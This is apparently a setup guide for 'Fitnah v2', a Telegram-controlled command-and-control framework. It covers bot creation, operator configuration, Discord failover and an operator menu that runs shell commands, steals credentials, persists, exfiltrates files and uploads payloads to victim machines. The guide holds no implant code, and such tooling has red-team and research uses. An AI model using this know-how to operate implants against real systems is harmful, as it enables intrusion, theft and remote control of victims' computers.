# Fitnah v2 — Telegram Bot Configuration

This guide covers Telegram bot creation, configuration, and operator setup for Fitnah v2.

## Creating a Telegram Bot

### Step 1: Create Bot via BotFather

1. Open Telegram app (or web.telegram.org)
2. Search for and message **@BotFather**
3. Type `/newbot`
4. BotFather asks: *"Alright, a new bot. How are we going to call it? Please choose a name for your bot."*
   - Reply: `Fitnah Lab` (human-readable name)
5. BotFather asks: *"Good. Now let's choose a username for your bot. It must end in 'bot'."*
   - Reply: `fitnah_lab_bot` (must be unique across Telegram, lowercase, no spaces)
6. BotFather replies with:
   ```
   Done! Congratulations on your new bot. You will find it at t.me/fitnah_lab_bot.
   You can now add a description, about section and profile picture for your bot,
   commands for client-side quick access to bot commands.
   
   Use this token to access the HTTP API:
   123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG
   ```

**Keep the token secret** — anyone with it can control your bot.

### Step 2: Get Your Operator Chat ID

Three methods to find your numeric Telegram ID:

#### Method A: @userinfobot (Easiest)

1. Message @userinfobot in Telegram
2. It replies with your **User ID** (numeric, like `1234567890`)

#### Method B: /start Webhook

1. Message your bot (`@fitnah_lab_bot`)
2. The C2 server logs the message sender ID
3. Check logs: `grep "sender=" logs/fitnah.log`

#### Method C: API Query

```bash
curl "https://api.telegram.org/bot123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG/getUpdates"
```

In the JSON response, look for `"id": 1234567890` under the `message` → `from` object.

---

## Chat Types: Group vs Channel vs Direct Message

### Direct Message (Recommended for Solo Operator)

- **Pro**: Private, only you see output, full inline keyboard support
- **Con**: Single operator only
- **Setup**: Message your bot directly (`@fitnah_lab_bot`)
- **Config**: `operator_chat_id: 1234567890` (your numeric ID)

### Private Group

- **Pro**: Multiple operators can see agents/loot, collaborative
- **Con**: Inline keyboard editing more fragile with multiple users
- **Setup**:
  1. Create Telegram group (not supergroup)
  2. Add your bot to the group
  3. Message `/start` in the group (so bot knows its chat ID)
  4. Get group ID:
     ```bash
     # Check logs
     grep "group_id=" logs/fitnah.log
     # OR: curl getUpdates as shown above
     ```
  5. **Group IDs are negative** (e.g., `-1001234567890`)
  6. Config: `operator_chat_id: -1001234567890`

### Supergroup

- **Pro**: 200k+ members, topics, moderation
- **Con**: Overkill for C2 operator chats, same issues as group
- **Setup**: Same as Private Group, but group ID starts with `-100`

### Channel

- **Not Recommended** — bots can't receive messages from channels
- Avoid for operator control (use for broadcast only)

---

## Configuring Fitnah with Telegram

### Basic Configuration

Edit `config/framework.yaml`:

```yaml
telegram:
  token: "123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG"  # from @BotFather
  operator_chat_id: 1234567890                             # your numeric ID (or group ID if negative)

http:
  enabled: true
  host: "127.0.0.1"
  port: 8888
  agent_key: "change-this-secret-key"

operator_tag: "my-operator"    # audit log label for your actions
allowed_ids: []                # empty = allow all; or [1234567890, 9876543210]

checkin_ttl: 300
task_timeout: 30
failover_threshold: 3
```

### Multi-Operator Setup

To allow multiple operators to control the same C2 (each with their own inline keyboard):

```yaml
telegram:
  token: "YOUR_TOKEN"
  operator_chat_id: 1234567890  # primary operator

allowed_ids:
  - 1234567890    # primary operator
  - 9876543210    # secondary operator (team member)
  - 5555555555    # another team member
```

**Important**: Each operator gets independent inline keyboard state (separate `handle_text` input modes). Shell commands, downloads, and uploads are operator-specific.

### Storing Token Securely

**Never commit `config/framework.yaml` with your real token to git.**

#### Option 1: Environment Variables

```bash
# Set before starting server
export FITNAH_TELEGRAM_TOKEN="your-real-token"
export FITNAH_TELEGRAM_OPERATOR_ID="1234567890"

python fitnah.py
```

Then in `config/framework.yaml`:

```yaml
telegram:
  token: ${FITNAH_TELEGRAM_TOKEN}  # OR: ${env:FITNAH_TELEGRAM_TOKEN}
  operator_chat_id: ${FITNAH_TELEGRAM_OPERATOR_ID}
```

#### Option 2: Separate Secrets File (Recommended)

Create `config/secrets.yaml` (gitignored):

```yaml
telegram:
  token: "123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG"
  operator_chat_id: 1234567890
```

Load in Python before creating Kernel:

```python
from fitnah.config import Config
cfg = Config()
cfg.load("config/secrets.yaml")  # override with secrets
```

#### Option 3: `.env` File + python-dotenv

```bash
# .env (gitignored)
TELEGRAM_TOKEN=123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG
TELEGRAM_OPERATOR_ID=1234567890
```

```python
from dotenv import load_dotenv
import os

load_dotenv()
token = os.getenv("TELEGRAM_TOKEN")
operator_id = int(os.getenv("TELEGRAM_OPERATOR_ID"))
```

---

## Testing Connectivity

### 1. Verify Token Works

```bash
curl "https://api.telegram.org/bot123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG/getMe"
```

Response (if valid):

```json
{
  "ok": true,
  "result": {
    "id": 987654321,
    "is_bot": true,
    "first_name": "Fitnah Lab",
    "username": "fitnah_lab_bot"
  }
}
```

### 2. Send Test Message

```bash
curl -X POST "https://api.telegram.org/bot123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG/sendMessage" \
  -d "chat_id=1234567890" \
  -d "text=Hello from Fitnah"
```

You should receive a message in Telegram immediately.

### 3. Run C2 and Message Bot

```bash
python fitnah.py
```

In Telegram, message your bot or the group:

```
/start
```

If the bot responds with the main menu (Sessions, Loot, Builder, Status), connectivity is working.

### 4. Check Logs

```bash
tail -f logs/fitnah.log | grep -i telegram
```

Expected lines:

```
[telegram] connected
[telegram] polling updates
[ui] callback: main  chat=1234567890
```

---

## Group ID Extraction Tools

### Get Group ID (Python)

```python
from telegram import Bot
import asyncio

async def get_group_id(token):
    bot = Bot(token)
    # After sending /start in the group:
    updates = await bot.get_updates()
    for u in updates:
        if u.message and u.message.chat.type == "group":
            print(f"Group ID: {u.message.chat_id}")
            print(f"Group Name: {u.message.chat.title}")

asyncio.run(get_group_id("YOUR_TOKEN"))
```

### Get Group ID (Shell)

```bash
TOKEN="123456789:ABCDEfGHijKLmNoPqRsT_uVwXyZ_AbCdEfG"
curl "https://api.telegram.org/bot$TOKEN/getUpdates" | jq '.result[] | select(.message.chat.type=="group") | .message.chat'
```

Response includes `id` field (negative for groups).

---

## Inline Keyboard UI Walkthrough

Once connected, the operator sees:

### Main Menu

```
🔴 Fitnah v2
─────────────────────
Active agents : 0
Transport     : telegram

[📡 Sessions] [💾 Loot]
[🔨 Builder]  [📊 Status]
[📶 Listeners]
```

Click **Sessions** → list of all live agents

### Agent Menu (Per Session)

```
victim-pc-01
─────────────────────
Agent   : abc12345
User    : DOMAIN\admin
OS      : Windows 10 (x64)
Priv    : admin
IP      : 192.168.1.100
Transport: telegram
Last seen: 5s ago

[💻 Shell]      [🔍 Recon]
[🔑 Credentials][📁 Files]
[🔒 Persist]    [🌐 Pivot]
[🛡 Evasion]    [📦 Collect]
[📤 Exfil]      [📜 History]
[💀 Kill]       [🔄 Refresh]

[◀ Back]
```

### Shell Mode

1. Click **💻 Shell** on agent menu
2. Menu changes: "Type your command in the next message."
3. Send text (e.g., `whoami`)
4. Implant receives, executes, returns output
5. Results displayed as new message
6. Returns to agent menu

### Download Mode

1. Click **📁 Files** → **⬇ Download**
2. Send remote file path (e.g., `C:\Windows\System32\drivers\etc\hosts`)
3. Implant reads file, sends base64-encoded content
4. UI saves to loot DB and sends as Telegram document
5. Returns to agent menu

### Upload Mode

1. Click **📁 Files** → **⬆ Upload**
2. Send a Telegram document (file)
3. UI saves to staging area
4. Prompts: "Reply with remote path to upload to"
5. Send path (e.g., `C:\Windows\Temp\payload.exe`)
6. Implant writes file, returns status
7. Returns to agent menu

---

## Troubleshooting Telegram

| Issue | Solution |
|-------|----------|
| "telegram not configured" | Verify `token` and `operator_chat_id` in `config/framework.yaml` |
| Bot doesn't respond to `/start` | Check token is correct; test with `curl /getMe` |
| "Invalid token" error | Regenerate token via @BotFather (Settings → API Token) |
| Inline keyboard not appearing | May be due to group permissions; try direct message to bot |
| Messages delayed 10+ seconds | Telegram API lag or network issue; check `failover_threshold` |
| Can't receive files (upload) | Ensure bot has file handling permissions (default enabled) |
| Group ID extraction fails | Send a message in the group first; run `/start` command |
| Multi-operator conflicts | Each operator has independent state; OK to use simultaneously |

---

## Discord Fallback (Secondary Transport)

If Telegram is blocked or unavailable:

```yaml
telegram:
  token: "YOUR_TELEGRAM_TOKEN"
  operator_chat_id: 1234567890

discord:
  enabled: true
  token: "YOUR_DISCORD_BOT_TOKEN"
  operator_channel_id: 987654321

failover_threshold: 3  # switch to Discord after 3 Telegram failures
```

See `README_DISCORD.md` for full Discord setup.

---

## Security Best Practices

1. **Rotate token regularly** — BotFather → Settings → API Token
2. **Use separate bot per environment** — lab bot ≠ production bot
3. **Don't hardcode secrets** — use env vars or `.env` file
4. `.gitignore` your secrets:
   ```
   config/framework.yaml
   config/secrets.yaml
   .env
   *.log
   build/
   data/
   ```
5. **Limit `allowed_ids`** — only list trusted Telegram users
6. **Monitor audit.log** — check for unauthorized command execution
7. **Use strong `agent_key`** in HTTP listener (hard for implant to guess)

---

## Next Steps

- **Usage**: See `README_USAGE.md` for operational commands
- **Plugins**: See `README_PLUGINS.md` to extend functionality
- **Discord**: See `README_DISCORD.md` for fallback transport
